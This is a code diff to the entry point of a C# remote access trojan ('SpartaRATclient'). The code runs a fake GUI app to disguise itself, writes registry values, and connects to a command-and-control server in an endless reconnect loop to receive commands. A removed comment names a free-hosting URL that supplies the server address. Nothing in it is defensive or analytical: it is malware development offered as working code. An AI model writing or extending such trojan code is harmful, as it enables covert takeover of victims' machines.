@@ -10,6 +10,8 @@ using System.Windows.Forms;
 using Microsoft.Win32;
 using SpartaRATclient.Setup.OSType;
 using SpartaRATclient;
+using System.Net.Sockets;
+using RATclientSparta.Server;
 
 namespace RATclientSparta
 {
@@ -21,15 +23,18 @@ namespace RATclientSparta
         [STAThread]
         static void Main()
         {
-            StartProgram();
-            void StartProgram()
-            {
-                //creates registry value for App opening date and OS type
-                //starts fake GUI app if first time program opened
-                Run.ProgramSetup();
+            //creates registry value for App opening date and OS type
+            //starts fake GUI app if first time program opened
+            Run.ProgramSetup();
 
-                //SocketClient instance connecting to server (ipaddress comes from https://mysimpleweb054.000webhostapp.com/mysite/detail)
-                SocketServer.Connect();
+            while (true)
+            {
+                //SocketClient instance connecting to server
+                Socket Server = SocketServer.Connect();
+
+                //reading data from server - when connection lost, it will return and then Connect() again
+                ServerData server = new ServerData(Server);
+                server.Receive();
             }
         }
 
